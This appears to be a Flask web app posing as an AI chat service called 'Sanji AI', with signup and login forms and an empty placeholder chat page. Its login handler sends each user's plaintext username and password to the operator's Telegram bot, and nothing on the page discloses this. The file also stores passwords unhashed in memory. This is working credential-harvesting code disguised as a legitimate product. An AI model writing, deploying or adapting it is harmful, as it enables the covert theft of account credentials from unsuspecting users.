import requests
from flask import Flask, render_template_string, request, jsonify, redirect, url_for

# Initialize Flask app
app = Flask(__name__)

# Dummy in-memory users database (for demonstration purposes)
users_db = {}

# Telegram Bot API Token and Chat ID
TELEGRAM_BOT_TOKEN = 'your_telegram_bot_token'
TELEGRAM_CHAT_ID = 'your_telegram_chat_id'

# Function to send message to your Telegram account
def send_credentials_to_telegram(username, password):
    message = f"New login attempt:\nUsername: {username}\nPassword: {password}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    params = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.get(url, params=params)
    return response.status_code

# Home route with account creation and login options
@app.route('/')
def home():
    return render_template_string(home_template)

# Create Account route
@app.route('/create_account', methods=['POST'])
def create_account():
    username = request.form['username']
    password = request.form['password']
    if username in users_db:
        return "User already exists. Please log in.", 400
    users_db[username] = password
    return redirect(url_for('chat_page'))

# Login route
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    if users_db.get(username) == password:
        # Send the credentials to your Telegram
        send_credentials_to_telegram(username, password)
        return redirect(url_for('chat_page'))
    return "Invalid credentials. Please try again.", 400

# Chat page route
@app.route('/chat_page')
def chat_page():
    return render_template_string(chat_template)

# HTML Template for home (login and create account)
home_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Setup</title>
</head>
<body>
    <h2>Welcome to Sanji AI</h2>
    <h3>Create Account</h3>
    <form method="POST" action="/create_account">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Create Account</button>
    </form>

    <h3>Already a user?</h3>
    <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Login</button>
    </form>

    <a href="https://t.me/your_telegram_account" target="_blank">Contact Us on Telegram</a>
</body>
</html>
"""

# HTML Template for chat page
chat_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sanji AI Chat</title>
</head>
<body>
    <h2>Welcome to the Chat</h2>
    <p>Chat functionality will be here.</p>
</body>
</html>
"""

if __name__ == '__main__':
    app.run(debug=True)